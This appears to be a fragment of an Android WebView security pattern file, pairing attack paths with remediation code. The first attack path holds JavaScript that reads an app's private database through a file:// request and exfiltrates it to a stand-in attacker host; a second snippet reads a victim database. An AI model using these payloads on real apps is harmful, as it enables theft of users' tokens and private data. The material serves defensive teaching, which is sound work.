patterns.attack_path:
Real-world attack: A deeplink or intent loads a malicious HTML file into the WebView. The page's JavaScript reads the app's SQLite databases, SharedPreferences (including auth tokens), and private files, then exfiltrates them to an attacker-controlled server.

1. Get a local HTML file loaded in the WebView (via deeplink, intent extra, or file write vulnerability)
2. Injected page runs:
   ```javascript
   var xhr = new XMLHttpRequest();
   xhr.open("GET", "file:///data/data/TARGET/databases/app.db", false);
   xhr.send(); 
   fetch("https://attacker.com/steal?data=" + btoa(xhr.responseText));
   ```
3. Reads: databases (app.db, preferences.xml, tokens), private files, certificates
4. No root required — exploits app's own file permissions to read its own private data
5. Can also reach SD card files, download directory, other world-readable files

patterns.remediation:
Use JSON encoding for all external data:
```java
String safe = new JSONObject().put("page", userInput).toString();
webView.evaluateJavascript("loadPage(" + safe + ")", null);
```

1. Remove component AND selector from parsed Intent
2. Verify target is exported before launching
```java
intent.setComponent(null);
intent.setSelector(null);
```

patterns.attack_path:
**File Theft via XHR:**
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/com.victim/databases/user.db', true);
```

patterns.remediation:
Never enable these settings:
```java
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);
```
